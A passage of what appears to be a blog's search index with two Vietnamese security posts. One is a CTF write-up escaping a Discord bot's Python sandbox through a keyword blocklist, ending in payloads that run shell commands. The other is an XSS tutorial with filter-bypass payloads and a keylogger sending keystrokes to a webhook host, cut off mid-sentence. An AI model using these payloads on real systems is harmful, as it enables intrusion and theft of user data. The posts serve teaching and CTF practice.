hehe: dice{web_1s_a_stat3_0f_grac3_857720}" }, { "title": "FPTU SecAthon 2020 | MISC Writeup | PRP301", "url": "/posts/FuSec3-PRP301/", "categories": "CTF, MISC Challenges", "tags": "writeups, misc, fusec20", "date": "2020-11-03 00:13:00 +0700", "snippet": "PRP301Thử thách:Discord Bot is broken :&amp;lt;Direct Message FUCTF Bot #3982 for more detail (￣︶￣*))Note: Using command !helpGợi ý: Pyjail !flag return 1 class, mro, subclass + string concatenationKiến thức nền: Using Discord Bot. PyJail Escape. OOP in Python. Pipeline. Server-sided template injection with Jinja2.Giải quyết vấn đề:1/ Initial reconnaissance (Pipeline, Using Discord Bot):Nhanh tay làm những việc sau: Join server discord của FU SecAthon, sau đó vào inbox trực tiếp với con bot của server (FUCTF BOT) trong DM để tra khảo nó:v Gõ !help để xem BOT hỗ trợ những command gì:. Chỉ có duy nhất 1 command ở đây mà chúng ta cần chú ý:Đây là link dẫn đến source code của con bot này. Cùng check xem có gì hay ho trong đó nào&amp;lt;3# bot.pyimport osimport sysfrom discord.ext import commandsimport asyncioimport discordfrom dotenv import load_dotenvload_dotenv()TOKEN = os.getenv(&#39;DISCORD_TOKEN&#39;)banned = [ &quot;import&quot;, &quot;exec&quot;, &quot;eval&quot;, &quot;pickle&quot;, &quot;os&quot;, &quot;subprocess&quot;, &quot;input&quot;, &quot;banned&quot;, &quot;compile&quot;, &quot;system&quot;, &quot;warnings&quot;, &quot;open&quot;, &quot;assert&quot;, &quot;per&quot;, &quot;pper&quot;, &quot;chr&quot;, &quot;exit&quot;, &quot;__import__&quot;,] blacklist = [&quot;[]&quot;, &quot;&#39;&#39;&quot;, &#39;&quot;&quot;&#39;, &quot;{}&quot;, &quot;write&quot;, &quot;read&quot;, &quot;communicate&quot;, &quot;base&quot;, &quot;getitem&quot;, &quot;shell&quot;, &quot;encode&quot;, &quot;decode&quot;, &quot;upper&quot;, &quot;lower&quot;] banned = banned + blacklisthelp_str = &#39;&#39;&#39;`Welcome to FU SecAthon Season 31. ping 2. help 3. author4. leak5. source6. version`&#39;&#39;&#39;author_str = &#39;&#39;&#39;`Web Exploitation: KhoaBDACryptography: PhiNCForensic + Miscellaneous: TungDLMBinary Exploitation: NghiaDTReverse Engineering: VinhTHP`&#39;&#39;&#39;leak_str = &#39;&#39;&#39;`Web Exploitation: https://quizlet.com/342338675/iaw-full-by-phat-flash-cards/Cryptography: https://quizlet.com/vn/457045651/cry302-flash-cardsReverse Engineering: https://quizlet.com/387215551/iam-hoi-bi-chuan-flash-cardsMiscellaneous: https://quizlet.com/vn/454992157/frs301_edited-flash-cards/Binary Exploitation: https://quizlet.com/vn/500408500/hod401-vinh-flash-cards/Forensic: https://quizlet.com/vn/454992157/frs301_edited-flash-cards/`&#39;&#39;&#39;source_str = &#39;&#39;&#39;`https://drive.google.com/drive/folders/1Ho55hI7XOOycyxCPrHdKyl20MuXSfyGU?usp=sharing`&#39;&#39;&#39;client = discord.Client()client = commands.Bot(command_prefix=commands.when_mentioned_or(&quot;!&quot;))client.remove_command(&#39;help&#39;)@client.eventasync def on_ready(): await client.change_presence(activity=discord.Game(name=&quot;###Welcome_Flag###&quot;))@client.command()async def ping(ctx): await ctx.send(f&#39;`Pong! {round (client.latency * 1000)}ms `&#39;)@client.command()async def help(ctx): await ctx.send(help_str)@client.command()async def author(ctx): await ctx.send(author_str)@client.command()async def leak(ctx): await ctx.send(leak_str)@client.command()async def source(ctx): await ctx.send(source_str)@client.command(name=&quot;flag&quot;)async def flag(ctx, *, data): if data.startswith(&quot;```&quot;) and data.endswith(&quot;```&quot;): data = &quot;\\n&quot;.join(data.split(&quot;\\n&quot;)[1:-1]) else: data = data.strip(&quot;` \\n&quot;) for ban in banned: if ban.lower() in data.lower(): await ctx.send(f&#39;Invalid Payload xD&#39;) return action = await asyncio.create_subprocess_exec(&quot;py&quot;, &quot;exploit.py&quot;, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE) try: out, err = await asyncio.wait_for(action.communicate(data.encode()), 5) except asyncio.TimeoutError: await action.kill() else: if out or err: await ctx.send(f&quot;```py\\n{out.decode()}{err.decode()}\\n```&quot;)@client.command()async def version(ctx): await ctx.send(sys.version)if __name__ == &#39;__main__&#39;: client.run(TOKEN)Có một số chỗ chúng ta cần chú ý trong source code này. Trước hết là array banned và blacklist: banned = [ &quot;import&quot;, &quot;exec&quot;, &quot;eval&quot;, &quot;pickle&quot;, &quot;os&quot;, &quot;subprocess&quot;, &quot;input&quot;, &quot;banned&quot;, &quot;compile&quot;, &quot;system&quot;, &quot;warnings&quot;, &quot;open&quot;, &quot;assert&quot;, &quot;per&quot;, &quot;pper&quot;, &quot;chr&quot;, &quot;exit&quot;, &quot;__import__&quot;,] blacklist = [&quot;[]&quot;, &quot;&#39;&#39;&quot;, &#39;&quot;&quot;&#39;, &quot;{}&quot;, &quot;write&quot;, &quot;read&quot;, &quot;communicate&quot;, &quot;base&quot;, &quot;getitem&quot;, &quot;shell&quot;, &quot;encode&quot;, &quot;decode&quot;, &quot;upper&quot;, &quot;lower&quot;] banned = banned + blacklistCó khả năng đây là danh sách các từ bị cấm sử dụng trong payload dùng để inject vào con bot. Kéo xuống gần cuối xem thì đúng là như vậy:for ban in banned: if ban.lower() in data.lower(): await ctx.send(f&#39;Invalid Payload xD&#39;) returnCũng ngay tại đoạn này tôi đã tìm ra cách để inject vào con bot. Đó là sử dụng lệnh “!flag + payload”:@client.command(name=&quot;flag&quot;)async def flag(ctx, *, data): if data.startswith(&quot;```&quot;) and data.endswith(&quot;```&quot;): data = &quot;\\n&quot;.join(data.split(&quot;\\n&quot;)[1:-1]) else: data = data.strip(&quot;` \\n&quot;)Tôi đã thử inject rất nhiều đoạn code python từ lớn đến bé bằng cách như sau nhưng bot chỉ trả về các dòng báo lỗi:Các lỗi trả về thường là “ ‘something’ is not defined”, và lỗi này có liên quan tới đoạn code print(hack[&quot;func&quot;]()) trong file exploit.py. Cùng check file này xem nào:import textwrapimport syshack = {&quot;__builtins__&quot;: {}}module = f&quot;def func():\\n{textwrap.indent(sys.stdin.read(), &#39; &#39;)}&quot;exec(module, hack)print(hack[&quot;func&quot;]())Chú ý vào hàm exec. Syntax của nó là: exec(object, dictionary).Đây là một hàm cho phép chúng ta thực thi một chương trình con được tạo ra bên trong chương trình lớn, ở đây nó được mô tả bằng string như sau: f&quot;def func():\\n{textwrap.indent(sys.stdin.read(), &#39; &#39;)}&quot; Đây là một f-string. Nó cũng tương tự như các string bình thường trừ việc chúng ta có thể truyền vào f-string expression bên trong cặp dấu {}. Khi chúng ta truyền vào một string bình thường chứa code thì hàm exec sẽ kiểm tra xem liệu các phương thức được call trong string có xuất hiện trong dictionary hay không. Ở đây dictionary chính là hack = {&quot;__builtins__&quot;: {}}, trong đó builtins là một module nền tảng, chứa tất cả các hàm thông dụng nhất của Python như print, input, và các hàm được phép define trong dictionary này chỉ giới hạn trong module builtins. Làm 1 ví dụ so sánh thế này cho dễ hiểu:Tuy nhiên, ngay cả khi trong dictionary builtins đã được gọi ra thì khi ta inject print(&#39;hello world&#39;) như hình trước đó thì vẫn trả về &#39;print&#39; is not defined mặc dù print là một hàm nằm trong module builtins. Lý do là vì trong dictionary tác giả không define bất kì hàm nào, hay nói đúng hơn là cái dictionary này trống không nên dùng bất kì hàm nào nó cũng báo lỗi hết! Well, thế nghe có vẻ không hợp lý cho lắm, nội dung của chương trình con chứa trong biến “module” có phần định nghĩa hàm: def func():, chả lẽ định nghĩa hàm func này xong chúng ta lại vứt nó ở đấy không viết gì thêm cho phần thân hàm nữa chỉ vì các hàm predefined đều không sử dụng được!!!??? Thật may vì đây là f-string:v Vì những gì bên trong cặp dấu {} của f-string sẽ được hàm exec bypass và sẽ được compiler xử lý như phần code nằm phía bên ngoài của string, chúng ta có thể tha hồ viết như thế này:f&quot;def func():\\n{textwrap.indent(sys.stdin.read(), &#39; &#39;)}&quot; mà không cần quan tâm hàm indent hay read kia có nằm trong module builtins hay dictionary chúng ta đã tạo ra hay không (tất nhiên chúng ta phải import textwrap và import sys mới xài 2 hàm kia được). Trước tiên chúng ta xét hàm [indent](https://docs.python.org/3/library/textwrap.html). Ở đây parameter &quot;text&quot; của hàm là một stdin, nói dơn giản thì đó là dữ liệu mà user nhập vào sẽ được hàm xử lý ngay tại chỗ, parameter còn lại - prefix ở đây là `&#39; &#39;` . Đi sâu hơn về stdin, ở tác giả sử dụng hàm read ([sys.stdin.read](https://www.geeksforgeeks.org/difference-between-input-and-sys-stdin-readline/)) để lọc dữ liệu đầu vào dựa theo parameter size. Demo thế này cho dễ hiểu:Giả dụ nếu tôi không truyền vào parameter size, tức là xóa số 4 trên hình kia đi cho nó giống với source code của tác giả, nó sẽ như nào nhỉ:Wait what!? Lúc nãy tôi nhập vào 1 lần ((nhập linh tinh gì cũng được) là nó cho ra ngay output là “haha” rồi kết thúc chương trình luôn. Còn bây giờ thì nó cứ bắt tôi nhập mãi không chịu dừng là thế nào??? (well, tôi phải Ctrl + C thì để dừng nó lại nên mới có cái traceback kia). Chúng ta có thể inject payload vào con bot được chính là nhờ có hàm này, chạy source code trên terminal nó ra như thế nào thì trên discord nó cũng phải giống y như vậy. Vậy tại sao nó lại méo giống thế nhỉ:vỞ trong discord thì chỉ cần nhập 1 lần thì chương trình đã dừng rồi. Vậy chắc phải có gì đó ở bên source code “bot.py” tác động vào thì nó mới ra được output trên discord khác so với terminal như thế này nhỉ. Bingo! Đúng là vậy thật:»action = await asyncio.create_subprocess_exec(&quot;py&quot;, &quot;exploit.py&quot;, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)Phân tích code một chút nào. Cú pháp asyncio cho chúng ta biết đây là một coroutine. Từ class asyncio gọi method create_subprocess_exec nhằm tạo ra một subprocess. Method này nhận có parameter “program” là “py” và parameter object chính là file source code “exploit.py”. Điều này có nghĩa là coroutine hiện tại đang chạy command “py” (lệnh của cmd dùng để gọi trình biên dịch Python) để translate các kí tự từ input stream của nó là file exploit.py thành một chương trình con. Các tham số về standard stream dùng để đều được set là asyncio.subprocess.PIPE. Đây là một giá trị đặc biệt thường dùng để gán cho stdin, stdout và stderr, thể hiện rằng một pipe kết nối từ subprocess được tạo ra (ở đây là process “action”) đến standard stream cần phải được mở ra. Điều này ảnh hưởng trực tiếp tới việc process “action” gọi method communicate ở khối code “try” ở ngay sau đó:try: out, err = await asyncio.wait_for(action.communicate(data.encode()), 5)except asyncio.TimeoutError: await action.kill()else: if out or err: await ctx.send(f&quot;```py\\n{out.decode()}{err.decode()}\\n```&quot;)Vì stdin=asyncio.subprocess.PIPE nên method communicate sẽ gửi data tới process “action” thông qua stdin (hình dung nó như 1 cái cổng để data (đã được encode thông qua data.encode()) có thể truyền vào 1 process), tất nhiên là với điều kiện tham số input (ở đây là data.encode()) của method communicate phải khác “None”. Tương tự, vì stdout=asyncio.subprocess.PIPE và stderr=asyncio.subprocess.PIPE) nên method communicate sẽ trả về một result tuple (stdout_data, stderr_data) như mong muốn thay vì trả về kết quả mặc định là “None” (hình dung stdout và stderr như 2 cái cổng ra của output tạo ra bởi process, nếu có thể trả về được output thì nó sẽ đi ra cổng stdout, nếu bị lỗi thì sẽ qua cổng stderr). action.communicate(data.encode()) là một awaitable object (hay đúng hơn là một coroutine), do đó có thể truyền nó vào method asyncio.wait_for. Đoạn asyncio.wait_for(action.communicate(data.encode()), 5) này có thể hiện rằng method wait_for này sẽ chờ coroutine action.communicate(data.encode()) trong khoảng thời gian 5 giây. Nếu xảy ra tình trạng timeout (asyncio.TimeoutError) thì ngay lập tức kill process “action” (await action.kill()), không thì output hoặc err sinh ra sẽ được gửi đến và hiển thị trên discord. Từ những phân tích ở trên chúng ta có thể tóm tắt quá trình hoạt động của asynchronous function “flag” như sau:@client.command(name=&quot;flag&quot;)async def flag(ctx, *, data): if data.startswith(&quot;```&quot;) and data.endswith(&quot;```&quot;): data = &quot;\\n&quot;.join(data.split(&quot;\\n&quot;)[1:-1]) else: data = data.strip(&quot;` \\n&quot;) for ban in banned: if ban.lower() in data.lower(): await ctx.send(f&#39;Invalid Payload xD&#39;) return action = await asyncio.create_subprocess_exec(&quot;py&quot;, &quot;exploit.py&quot;, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE) try: out, err = await asyncio.wait_for(action.communicate(data.encode()), 5) except asyncio.TimeoutError: await action.kill() else: if out or err: await ctx.send(f&quot;```py\\n{out.decode()}{err.decode()}\\n```&quot;) Bước 1: Khối lệnh if…else đầu tiên, đây là lúc chương trình xử lý tham số “data” được truyền vào của hàm flag (đồng thời cũng là dữ liệu do người dùng nhập vào từ discord, hay chính là payload). Nếu data.startswith(&quot;&quot;) and data.endswith(&quot;&quot;) thì thực hiện split string “data” thành một mảng string con theo kí tự “\\n” (Enter), đồng thời chỉ lấy các phần tử trong mảng mới tạo ra từ index số 1 đến index cuối cùng (bỏ phần tử đầu tiên có index 0): data.split(&quot;\\n&quot;)[1:-1] để đem đi join lại với kí tự “\\n”. Hình minh họa dưới đây sẽ giúp bạn hiểu rõ hơn:Nếu không như vậy thì thực hiện strip data theo 3 kí tự là “`”, “ “ và “\\n” : Bước 2: Tiếp theo là khối lệnh for ban in banned:, cái này thì tôi đã giải thích ở trên rồi, các bạn kéo lên mà đọc nhé:v Bước 3: Sau đó là câu lệnh tạo một subprocess để chạy trong chính chương trình hiện tại tên là “action”, và subprocess sẽ thực thi file exploit.py. Đoạn này tôi cũng đã giải thích rất kỹ rồi, các bạn lại kéo lên đọc tiếp nhé:v Bước 4: Cuối cùng và cũng là quan trọng nhất, subprocess “action” sau khi được tạo ra sẽ nhận vào đã data (string) vừa được cắt gọt, xử lý ở bước 1 để truyền vào chính nó. Process “action” thực thi file exploit.py, theo cơ chế pipeline, data (lúc này đã được encode) sẽ đóng vai trò là input của process “exploit” (hay còn gọi là “action”). Nói một cách đơn giản, thay vì phải ngồi input dữ liệu bằng tay cho “exploit” như thế này:vừa mỏi tay vừa bị lỗi chương trình bắt người dùng nhập vô hạn (tôi đã có đề cập ở phía trên những tới bây giờ mới giải thích đc:v), process cha (thực thi file bot.py) đã nhập hộ vào process con là “exploit” thay chúng ta rồi, và cái mà process “bot” nhập chính là biến data (đã được encode). Do đó khi truyền payload vào discord không xảy ra tình trạng chương trình bắt nhập dữ liệu liên tục không dừng như mình demo ở trên nữa, vì stdin của process “exploit” đã xác định được size của dữ liệu nhập vào nên khi gọi method sys.stdin.read() nó sẽ biết điểm dừng ở đâu mặc dù không truyền tham số size vào: Bước 5: Cuối cùng, sau quá trình liên kết giữa process cha và process con, method sẽ sinh ra turple out và err (có nói phía trên rồi thắc mắc thì đọc lại nha:3).2/ Exploiting (Python Jail Escape, OOP in Python):Sau khi initial reconnaissance, chúng ta đã biết được con đường vận chuyển payload của user sau khi được nhập trên discord như thế nào. Thay vì nhập những payload vô nghĩa để test thử chương trình hoạt động như nào, bây giờ chúng ta sẽ tập trung vào những cái có nghĩa hơn cho việc khai thác con bot. Như những gì tôi đã phân tích về source code “exploit,py”, dictionary “hack” mặc dù đã khai báo rằng mình sẽ sử dụng các method trong module builtins nhưng module builtins said: “Không, tao đếch có cái method gì để cho mày cả thằng “hack” ạ!”: hack = {&quot;__builtins__&quot;: {}}. Điều này đồng nghĩa với việc nếu chúng ta có các hàm của module này như print, file, open thì sẽ xuất ra err: “something” is not defined (có đề cập ở phần đầu của initial reconnaissance). Các method vốn không nằm trong builtins có thể dùng được như eval hay immport cũng bị tác giả cho vào blacklist gần hết:(( Nhưng chúng ta hoàn toàn có thể thay thế các method kia bằng lệnh return, đơn giản vì return là một keyword của python chứ không phải là predefined method như bọn kia, không phải “ăn nhờ ở đậu” ở bất cứ module nào. Test thử xem nào:GREATTT!!! Đây cũng chính là điều mà hint số 2 muốn nói. Tại sao nó có thể in ra số 1 như thể chúng ta đang nhập print(1) thế kia. Nhìn lại source code exploit.py một chút là biết:module = f&quot;def func():\\n {textwrap.indent(sys.stdin.read(), &#39; &#39;)}&quot;exec(module, hack)print(hack[&quot;func&quot;]())Sau khi inject payload return 1 vào, theo dòng pipeline và quá trình xử lý payload của stdin {textwrap.indent(sys.stdin.read(), &#39; &#39;)}, chúng ta sẽ có biến module (chứa executable code) ban đầu trở thành như thế này:module = &quot;def func():\\n return 1&quot;Tiếp theo sau khi exec(module, hack), hàm func được define trong biến module sẽ được nạp vào như một phần tử trong dictionary hack (bên cạnh cái builtins trống không). Cuối cùng chúng ta có thể in ra số 1 là nhờ print(hack[&quot;func&quot;]()) ra giá trị trả về của hàm func là 1.Như vậy, chúng ta đã giải quyết được vấn đề: “Làm thế nào để bắt con bot display cái gì đó ra theo ý mình?”. Đừng quên thứ mà chúng ta muốn display ở đây là flag, nhưng mà nó có thể ở đâu được nhỉ? Con bot này được kết nối với server của cuộc thi, trên server đó rất có thể chứa các file có khả năng có flag trong đấy kiểu như “flag.txt” chẳng hạn:v Vậy sao chúng ta không “cat flag.txt” (như kiểu trong terminal của Linux ý, server nó cũng chỉ như 1 cái PC chứa file trong đấy thôi mà:v) để đọc được nội dung bên trong nó là gì (thật may trong blacklist, banned của tác giả không có từ “cat”&amp;lt;3). Để có thể thực hiện được command này trong một chương trình Python thì phải có dùng method system, mà muốn có method này thì chúng ta phải load được module os. Nên nhớ cả “os” và “system” nó cũng nằm trong blacklist:v Để tránh bị con bot reponse lại là “Invalid Payload xD” chỉ có duy nhất một cách là string concatenation , ví dụ: thay vì phải inject vào payload là ‘os’, ta dùng: ‘o’+’s’. Tôi bỗng nhớ ra một method trong module “builtins” có thể có ích để giải quyết được vấn đề này, đó là getattr(). Thay vì gọi và truyền tham số cho method system theo kiểu “os.system(“cat flag.txt”)” như bình thường, chúng ta có thể gọi nó lại như sau để escape Python jail được của tác giả:getattr(os,&#39;sys&#39;+&#39;tem&#39;)(&quot;cat flag.txt&quot;) Như vậy, chúng ta đã vượt qua được 1 &quot;jail&quot;, &quot;jail&quot; tiếp theo cần phải vượt qua đó là &quot;os&quot; cũng như &quot;builtins&quot;. Cái khó nhất là ở đây, các keyword như &quot;import&quot; hay [&quot;__import__&quot; ](https://www.geeksforgeeks.org/how-to-dynamically-load-modules-or-classes-in-python/) đã bị cấm mất rồi, do đó chúng ta không thể import module theo cách thông thường được. Đây là lúc chúng ta áp dụng kiến thức về [SSTI](https://www.hacktoday.io/t/flask-jinja2-ssti-cheatsheet/2259) để escap Python Jail. Về cơ bản tôi có thể dễ dàng access một vào rất nhiều class (ở đây chính là các module) bằng cách kiểu như sau:().__class__.__mro__[&amp;lt;a number&amp;gt;].__subclasses__() Cùng phân tích cú pháp một chút nào. Dấu &quot;()&quot; kia biểu diễn một object trong Python, ở đây object &quot;()&quot; thuộc kiểu [tuple](https://toidicode.com/tuple-trong-python-347.html), nhưng đây lại là một tuple trống. Tôi hoàn toàn có thể thêm bao nhiêu phần tử vào trong cái tuple trống này cũng được mà không gặp vấn đề gì, kiểu như thế này:(1,2).__class__.__mro__[1].__subclasses__()Hoặc thậm chí là vứt thằng tuple này đi để sử dụng object “string”, nó cũng chả khác một tí gì:&#39;hehe&#39;.__class__.__mro__[1].__subclasses__() Có một định luật khá thú vị trong Python:&quot;Vạn vật đều là Object&quot;. Từ những cái nhìn tưởng như là những value vô hại để gán vào cho một biến chứa kiểu dữ liệu nào đó như string(&#39;hehe&#39;), tuple((1,2),()),..v.v thực chất tất cả chúng đều là một object thực thụ. Mà một object thì đương nhiên có thể gọi được method. Nhưng trước khi gọi được method, chúng ta phải tham chiếu tới kiểu dữ liệu của object hiện tại (xem giải thích tại [đây](https://stackoverflow.com/questions/20599375/what-is-the-purpose-of-checking-self-class-python#:~:text=__class__%20is%20a,type%20of%20the%20current%20instance.&amp;amp;text=Throwing%20an%20exception%20here%20is,you%20from%20making%20silly%20mistakes.&amp;amp;text=type%28%29%20should%20be%20preferred,shadowed%20by%20a%20class%20attribute.)):&amp;lt;object&amp;gt;.__class__ Minh họa một chút về syntax cho dễ hiểu:Object hiện tại thuộc kiểu dữ liệu “tuple”, tuy nhiên nó vẫn chưa phản ánh hết đầy đủ bản chất của object “()”, vì có thể object này có thể đang thừa kế từ rất nhiều class khác nữa, muốn biết điều này liệu có đúng hay không chúng ta phải kiểm tra xem “cây thừa kế” có những gì. Tôi có thể dễ dàng làm được điều này bằng cách gọi thuộc tính mro của object hiện tại:&amp;lt;object&amp;gt;.__class_.__mro__ Demo một chút nào:Như vậy, output của ().__class__.__mro__ là một tuple bao gồm 2 phần tử là , &amp;lt;class &#39;tuple&#39;&amp;gt; và &amp;lt;class &#39;object&#39;&amp;gt;, trong đó phần tử thứ 2 của tuple chính là class “thủy tổ” trong ngôn ngữ Python, mọi class cho dù là predefined hay user-defined đều ngầm định là class thừa kế, là con của class &#39;object&#39;. Từ class “thủy tổ” này chúng ta có thể truy cập đến một list rất rộng các class con của nó, trong đó chắc chắn bao gồm class có sẵn (predefined) trong Python, và bên trong các “predefined class” này lại chắc chắn chứa một module hay package chứa module (bản thân module cũng chính là class) nào đó có các method hữu dụng để load các module khác lên giống như kiểu câu lệnh “import” (bản thân “import” cũng là predefined:v), bằng cách sử dụng method subclass (từ đoạn này chúng ta chỉ quan tâm đến danh sách các class con của class “object” thôi):&amp;lt;object&amp;gt;.__class_.__mro__[1].__subclasses__()Awesome!!!! Đừng thấy nó trông nhiều như thế mà hoa mắt, bởi vì mục tiêu mà ta đang tìm kiếm là một module nào đó có liên quan đến câu lệnh “import”. Sau 1 quá trình google không ngừng, tôi đã tìm ra thứ mình cần đó là package importlib (đây chính là implementation của “import”). Nghiên cứu doc của package này tôi phát hiện ra có module machinery chứa các object cần thiết giúp “import” tìm và load các module. Chúng ta đang cần tìm và load các built-in module lên, vậy chắc chắn không có lý do gì ta lại không dùng [BuiltinImporter] - (https://docs.python.org/3/library/importlib.html#importlib.machinery.BuiltinImporter) - một importer chuyên dùng cho việc này. Giờ chúng ta chỉ việc CTRL + F và tìm xem importer BuiltinImporter có xuất hiện trong output trả về trên kia không nào:Cool:))) Mày ở đây rồi!!! Trong array mà ().__class__.__mro__[1].__subclasses__() trả về thì phần tử &amp;lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&amp;gt; nằm ở vị trí 84 (để biết tại sao nó lại là class &#39;_frozen_importlib.BuiltinImporter&#39; chứ không phải là class importlib.machinery.BuiltinImporter bạn có xem tại đây). Từ class (module) này chúng ta có thể implement importlib.abc.InspectLoader, tới đây chúng ta có thể lấy được chìa khóa để kết thúc challenge này, đó là method load_module của class “InspectLoader”. Tóm lại, từ những gì thu thập được, các payload cuối cùng dẫn đến flag của tôi là (dùng cái nào cũng đúng hết):return ().__class__.__mro__[1].__subclasses__()[84].load_module(&#39;buil&#39;+&#39;tins&#39;).getattr(().__class__.__mro__[1].__subclasses__()[84].load_module(&#39;o&#39;+&#39;s&#39;), &#39;sys&#39;+&#39;tem&#39;)(&quot;cat flag.txt&quot;)return &#39;ConBOTDBGRFromLuaDLM&#39;.__class__.__mro__[1].__subclasses__()[84].load_module(&#39;buil&#39;+&#39;tins&#39;).getattr(().__class__.__mro__[1].__subclasses__()[84].load_module(&#39;o&#39;+&#39;s&#39;), &#39;sys&#39;+&#39;tem&#39;)(&quot;cat flag.txt&quot;)return (1,2).__class__.__mro__[1].__subclasses__()[84].load_module(&#39;buil&#39;+&#39;tins&#39;).getattr(().__class__.__mro__[1].__subclasses__()[84].load_module(&#39;o&#39;+&#39;s&#39;), &#39;sys&#39;+&#39;tem&#39;)(&quot;cat flag.txt&quot;)Cay cú quá, đi thi đếch giải ra, về nhà mới giải ra:(((" }, { "title": "XSS cơ bản | CORS và CSP", "url": "/posts/XSS-co-ban-CORS-CSP/", "categories": "Wiki, Web Exploitation", "tags": "wiki, web, xss", "date": "2020-11-03 00:13:00 +0700", "snippet": "XSS là gìXSS - Cross-site Scripting là một kỹ thuật tấn công code injection trên phía client. Kẻ tấn công mục đích khai thác các dữ liệu nhạy cảm của người dùng khác bằng cách chèn các đoạn code độc hại trong trình duyệt Web, những mã độc này thường được viết với ngôn ngữ lập trình như Javascript, HTML…. Khai thác tấn công XSS chỉ thực sự xảy ra khi nạn nhân truy cập vào trang web hoặc ứng dụng thực thi các đoạn mã độc.Về cơ bản, một ứng dụng có chứa lỗ hổng XSS đều xảy ra từ các trường input parameter được nhập vào từ người dùng, dữ liệu này sẽ chạy một cách hợp lệ trên trình duyệt, ứng dụng. Nguyên nhân chính của loại tấn công này là thiếu xác thực đầu vào dữ liệu người dùng, dữ liệu đầu ra trả về cho người dùng không được mã hóa và xử lý cẩn thận khiến những đoạn script độc hại có thể thực thi hợp lệ trên trình duyệt của nạn nhân.Rủi ro: Người dùng bị chiếm phiên làm việc, đánh cắp cookie, token,… Thay đổi giao diện của ứng dụng, website. Quảng cáo hoặc bôi nhọ trang web, ứng dụng. Sử dụng phần cứng để nghe, chụp hình hay đào bitcoin. Các kiểu tấn công XSSReflect XSSKẻ tấn công gửi cho nạn nhân một liên kết đến ứng dụng thông qua email, mạng xã hội,… nó chứa scripts độc hại được nhúng bên trong và sẽ thực thi khi truy cập trang web. Nó được gọi là reflect (ánh xạ) vì trong kịch bản khai thác này, hackers phải gửi cho nạn nhân một URL chứa scripts (phishing).Nạn nhân chỉ cần truy cập URL này, hacker sẽ nhận được phản hồi chứa kết quả mong muốn.Ví dụ, tại vị trí tìm kiếm của một ứng dụng, thay vì chèn nội dụng tìm kiếm bình thường, attacker chèn mã script, trình duyệt xử lý và hiện thị dữ liệu truyền vào trên màn hình. Và script độc hại được thực thi./?q=%253c%252ftitle%253e%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253eThay vì hiện thị bảng thông báo cookie, attacker có thể thay bằng gửi cookie đến server của mình và có được phiên của nạn nhân.Stored XSSKẻ tấn công có thể chèn scripts vào những vị trí có thể lưu lại trong ứng dụng chứa lỗ hổng XSS, thường là lưu tại database và được hiện thị trên giao diện. Ví dụ như tên, comment, post được lưu trên ứng dụng, từ đó trình duyệt sẽ đọc và scripts được thực thi khi bất kỳ ai truy cập vào. Nạn nhân request đến thông tin được lưu trữ và bị đánh cắp thông tin. Gọi là Stored-XSS.Khác với Reflect XSS là attacker phải gửi cho nạn nhân nhằm lừa nạn nhân truy cập. Còn với Stored XSS không cần phải thực hiện điều này. Ngoài ra, nó còn có thể tấn công nhiều nạn nhân mà chỉ cần một lần chèn scripts. Từ đó có thể thấy Stored XSS nguy hiểm hơn Reflect XSS rất nhiều, và nếu là quản trị hay người dùng cấp cao, hậu quả sẽ rất nghiêm trọng.Ví dụ, ứng dụng chứa lỗ hổng có lưu trữ bao gồm các trường hồ sơ như username hay email, thông tin lưu trên máy chủ đó hiển thị trên giao diện ứng dụng.DOM Based XSSScripts được chèn và sửa đổi DOM (Document Object Model) của trang web trong code phía nạn nhân và sau đó được thực thi, kỹ thuật này thay đổi cấu trúc DOM, cụ thể là HTML, nó làm thay đổi giao diện phía người dùng. Khác với reflect cũng là gửi để phishing nạn nhân nhưng không gửi dữ liệu đến server, nó trực tiếp chạy trên trình duyệt nạn nhân, điều này giảm thiểu filter từ phía server.Ví dụ trang lấy giá trị parameter trên URL để hiển thị thông báo trên màn hình, thay vì chèn chuỗi thông báo, attacker chèn scripts và nó được thực thi trên trình duyệt nạn nhân.Blind XSSKỹ thuật này xảy ra khi kẻ tấn công không thể thấy được kết quả của cuộc tấn công vì kết quả lỗ hổng thường nằm trên một trang mà chỉ những người dùng được ủy quyền mới có thể truy cập. Kiểu khai thác này thường phải dùng payload phức tạp hơn để có thể nhận biết được nếu vị trí tồn tại lỗ hổng cũng như payload của kẻ tấn công được thực thi thành công.Ví dụ lỗ hổng tại form feed back về ứng dụng, chỉ quản trị có thể đọc nội dung bị nhiễm mã khai thác.Một số case phức tạp hơnBypass filterVí dụ filter blacklist không đầy đủ, hoặc payload được obfuscate: &amp;lt;sCrIpT&amp;gt;alert(&#39;xss&#39;);&amp;lt;/ScRiPt&amp;gt;Bypass trường hợp hợp thẻ &amp;lt;script&amp;gt; bị xóa trước khi hiển thị: &amp;lt;svg o&amp;lt;script&amp;gt;nload=alert(1)&amp;gt;Kết quả: &amp;lt;svg onload = alert(1)&amp;gt;Hoặc: &amp;lt;%00script&amp;gt;alert(1)&amp;lt;/script&amp;gt;%00 trả về giá trị null khi đó 1 số filter không cẩn thận sẽ cho phép mã khai thác dạng nàyPhishing: những thẻ hợp lệ như &amp;lt;a&amp;gt; cũng đều có thể được lợi dụng gây ra lỗ hổng XSS, ví dụ:&amp;lt;a href=https://attacker/&amp;gt;Session expired. Please login again.&amp;lt;/a&amp;gt;&amp;lt;a href=&quot;javascript:alert(1)&quot;&amp;gt;Click Here&amp;lt;/a&amp;gt;Mã hóa: mã hóa payload là 1 trong các cách được attackers hay dùng ví dụ như encode scripts bằng URL, trình duyệt sẽ decode từ HTML/URL thành script và thực thi:%26%23x22%3B%3E%26%23x3C%3Bscript%3Ealert%26%23x28%3B1)%26%23x3C%3B/script%3ETạo Keylogger, attacker có chèn script ghi phím gõ trực tiếp của người dùng và gửi về server của kẻ tấn công ví dụ 1 đoạn script:&amp;lt;script&amp;gt;var keys=&quot;&quot;;document.onkeypress = function(e) {get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys+=key;}window.setInterval(function(){if(keys != &quot;&quot;) {new Image().src = &quot;https://webhook.site/f6d7fb91-a0b3-4604-b1b2-853553ddd8a9?c=&quot;+keys;keys = &quot;&quot;;}}, 500)&amp;lt;/script&amp;gt;Gửi request tới server: hacker có thể dùng nhiều hàm 